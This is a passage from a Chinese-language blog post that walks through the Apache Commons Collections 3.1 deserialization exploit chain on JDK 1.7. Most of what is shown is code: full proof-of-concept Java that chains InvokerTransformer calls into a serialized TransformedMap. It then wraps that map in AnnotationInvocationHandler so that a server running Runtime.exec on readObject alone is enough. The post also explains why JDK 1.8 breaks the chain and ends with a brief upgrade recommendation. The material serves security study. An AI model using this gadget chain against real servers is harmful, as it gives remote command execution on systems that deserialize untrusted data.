{Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //將transformers數組存入ChaniedTransformer這個繼承類Transformer transformerChain = new ChainedTransformer(transformers); //創建Map並綁定transformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //給予map數據轉化鏈Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payload序列化寫入文件，模擬網絡傳輸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(outerMap); //2.服務端接受反序列化，出發漏洞//讀取文件，反序列化，模擬網絡傳輸FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服務端反序列化成Map格式，再調用transform函數Map outerMap_now = (Map)fin.readObject; //2.1可以直接map添加新值，觸發漏洞//outerMap_now.put("123", "123");//2.2也可以獲取map鍵值對，修改value，value為value，foobar,觸發漏洞Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next;onlyElement.setValue("foobar");}</p><p>親測有效</p><p><strong>第四步 jdk1.7 AnnotationInvocationHandler的readObject複寫點</strong></p><p>上面的漏洞觸發條件仍然不夠完美，需要服務端把我們傳入的序列化內容反序列化為map，並對值進行修改。之前也說過完美的反序列化漏洞還需要一個readobject複寫點，使只要服務端執行了readObject函數就等於命令執行。</p><p>在jdk1.7中就存在一個完美的readobject複寫點的類sun.reflect.annotation.AnnotationInvocationHandler。我們先看他的構造函數</p><p>AnnotationInvocationHandler(Class&lt;? extends Annotation> var1, Map&lt;String, Object> var2) {Class var3 = var1.getInterfaces; if (var1.isAnnotation && var3.length == 1 && var3[0] == Annotation.class) {//var1滿足這個if條件時this.type = var1;//傳入的var1到this.typethis.memberValues = var2;//我們的map傳入this.memberValues} else { throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");}}</p><p>readobject複寫函數：</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //默認反序列化var1.defaultReadObject;AnnotationType var2 = null; try {var2 = AnnotationType.getInstance(this.type);} catch (IllegalArgumentException var9) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var3 = var2.memberTypes;//Iterator var4 = this.memberValues.entrySet.iterator;//獲取我們構造map的迭代器while(var4.hasNext) {Entry var5 = (Entry)var4.next;//遍歷map迭代器String var6 = (String)var5.getKey;//獲取key的名稱Class var7 = (Class)var3.get(var6);//獲取var2中相應key的class類？這邊具體var3是什麼個含義不太懂，但是肯定var7、8兩者不一樣if (var7 != null) {Object var8 = var5.getValue;//獲取map的valueif (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //兩者類型不一致，給var5賦值！！具體賦值什麼已經不關鍵了！只要賦值了就代表執行命令成功var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass + "[" + var8 + "]")).setMember((Method)var2.members.get(var6)));}}}}}</p><p>雖然相對於這個類具體做什麼，實在是沒有精力去搞清楚了，但是它最終對於我們傳入構造函數的map進行遍歷賦值。這樣就彌補了我們之前反序列化需要服務端存在一些條件的不足，形成完美反序列化攻擊。</p><p>最終模擬攻擊代碼</p><p>public static void main(String args) throws Exception { //1.客戶端構建攻擊代碼//此處構建了一個transformers的數組，在其中構建了任意函數執行的核心代碼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //將transformers數組存入ChaniedTransformer這個繼承類Transformer transformerChain = new ChainedTransformer(transformers); //創建Map並綁定transformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //給予map數據轉化鏈Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //反射機制調用AnnotationInvocationHandler類的構造函數Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消構造函數修飾符限制ctor.setAccessible(true); //獲取AnnotationInvocationHandler類實例Object instance = ctor.newInstance(Target.class, outerMap); //payload序列化寫入文件，模擬網絡傳輸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(instance); //2.服務端讀取文件，反序列化，模擬網絡傳輸FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服務端反序列化fin.readObject;}</p><p>成功</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/a4c79ee037ac4359b1d974630c0e5bb0><p class=pgc-img-caption></p></div><p>至此，我們在客戶端構造了payload發送至服務端，只要服務端</p><ol start=1><li>對我們的輸入進行反序列化</li><li>jdk版本為1.7</li></ol><p>就可以直接完成命令執行，完美！</p><p><strong>jdk1.8為什麼不行呢</strong></p><p>那麼jdk1.8為啥不行呢,看一下jdk8裡面的sun.reflect.annotation.AnnotationInvocationHandler readObject複寫點：</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {GetField var2 = var1.readFields;Class var3 = (Class)var2.get("type", (Object)null);Map var4 = (Map)var2.get("memberValues", (Object)null);AnnotationType var5 = null; try {var5 = AnnotationType.getInstance(var3);} catch (IllegalArgumentException var13) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var6 = var5.memberTypes;LinkedHashMap var7 = new LinkedHashMap;String var10;Object var11; for(Iterator var8 = var4.entrySet.iterator; var8.hasNext; var7.put(var10, var11)) {Entry var9 = (Entry)var8.next;var10 = (String)var9.getKey;var11 = null;Class var12 = (Class)var6.get(var10); if (var12 != null) {var11 = var9.getValue; if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) { //很傷心的，沒有了map賦值語句var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass + "[" + var11 + "]")).setMember((Method)var5.members.get(var10));}}}</p><p>因為這個函數出現了變動，不再有賦值語句，所以觸發不了漏洞。</p><p><strong>No.6寫在後面</strong></p><p>至此我們就完成common-collection 3.1版本 jdk1.7版本下的POC復現和利用鏈分析。當然還有common-collection 不同組件版本，不同環境下poc和利用鏈均有不同，在ysoserial下就有7，8中利用方式。還可以通過rmi模式進行利用等。</p><p>但是由於這篇博客寫的太長了，思路也一直斷斷續續，其他內容之後再陸續學習分析吧~</p><p><strong>No.7修復意見</strong></p><p>commons-collections組件版本 升級至官方最新版本</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>序列化</a></li><li><a>JAVA</a></li><li><a>commons</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/a90a489a.html alt=JAVA中多態的概念和應用，通過案例分析成員變量、方法的訪問特點 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/15310942260931dda577a75 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/a90a489a.html title=JAVA中多態的概念和應用，通過案例分析成員變量、方法的訪問特點>JAVA中多態的概念和應用，通過案例分析成員變量、方法的訪問特點</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/9cfcdd6f.html alt=《JAVA編程思想》5分鐘速成：第8章（多態） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/399a29d93fde48fca4bae44dffbced07 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/9cfcdd6f.html title=《JAVA編程思想》5分鐘速成：第8章（多態）>《JAVA編程思想》5分鐘速成：第8章（多態）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/6f585f1e.html alt=JAVA入門到大神（玩轉正則表達式） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/6f585f1e.html title=JAVA入門到大神（玩轉正則表達式）>JAVA入門到大神（玩轉正則表達式）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8a3d9e7a.html alt=「JAVA」從格式化輸出到掃描輸入，深究Java正則表達式匹配之道 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/dfic-imagehandler/ea11259e-5098-451f-b989-4e3169a16a1c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8a3d9e7a.html title=「JAVA」從格式化輸出到掃描輸入，深究Java正則表達式匹配之道>「JAVA」從格式化輸出到掃描輸入，深究Java正則表達式匹配之道</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/e2ad303f.html alt=給JAVA開發人員的正則表達式入門課 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/5d620d422d0a4855924c5bcbf8ba483a style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/e2ad303f.html title=給JAVA開發人員的正則表達式入門課>給JAVA開發人員的正則表達式入門課</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/fd0a9e51.html alt=JAVA怎麼處理異常 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/dfic-imagehandler/6cf507ab-d41c-4bb0-bef0-6def0eb1fef8 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/fd0a9e51.html title=JAVA怎麼處理異常>JAVA怎麼處理異常</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/d3bb906c.html alt=一文帶你看懂二叉樹的序列化 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/da5436c407ec4fc68dfb02f6948e3ba9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/d3bb906c.html title=一文帶你看懂二叉樹的序列化>一文帶你看懂二叉樹的序列化</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/3906fa80.html alt=JAVA應用程序開發之集合類 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/aa9e1fe1752a4a1886a691485e0e1373 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/3906fa80.html title=JAVA應用程序開發之集合類>JAVA應用程序開發之集合類</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/c4f080cc.html alt=小白學JAVA之——List接口的實現類——ArrayList class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/b14b6a69b8354d53a35156eaa365395e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/c4f080cc.html title=小白學JAVA之——List接口的實現類——ArrayList>小白學JAVA之——List接口的實現類——ArrayList</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/67f00d06.html alt=學習廖雪峰的JAVA教程---異常處理（使用斷言） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/67f00d06.html title=學習廖雪峰的JAVA教程---異常處理（使用斷言）>學習廖雪峰的JAVA教程---異常處理（使用斷言）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/866b06ba.html alt=創建一個擴展名為nb的圖片，淺談Python的文件管理和序列化操作 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/dfic-imagehandler/3b8cb777-6c9f-4d02-9412-9d4e26488710 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/866b06ba.html title=創建一個擴展名為nb的圖片，淺談Python的文件管理和序列化操作>創建一個擴展名為nb的圖片，淺談Python的文件管理和序列化操作</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/f08377c0.html alt=慕課認為JAVA架構師應該具備的10大能力，你會多少？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/7414bd0cbfe848a98777302c4730c09e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/f08377c0.html title=慕課認為JAVA架構師應該具備的10大能力，你會多少？>慕課認為JAVA架構師應該具備的10大能力，你會多少？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/37154d9a.html alt=寫了10年JAVA代碼，為何還是給人一種亂糟糟的感覺？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/dfic-imagehandler/eadb4752-5f6b-4a85-ac99-5c6fae2b5bbc style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/37154d9a.html title=寫了10年JAVA代碼，為何還是給人一種亂糟糟的感覺？>寫了10年JAVA代碼，為何還是給人一種亂糟糟的感覺？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/32ee6540.html alt=JAVA上加密算法的實現用例 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/6aa97b7dfebc473ebb4ea11cc67c6614 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/32ee6540.html title=JAVA上加密算法的實現用例>JAVA上加密算法的實現用例</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/e4f66bb9.html alt="算法：字符串相加  （JAVA）" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/e989f66b713445ec8371accf7f23ce2f style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/e4f66bb9.html title="算法：字符串相加  （JAVA）">算法：字符串相加 （JAVA）</a></li><hr></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>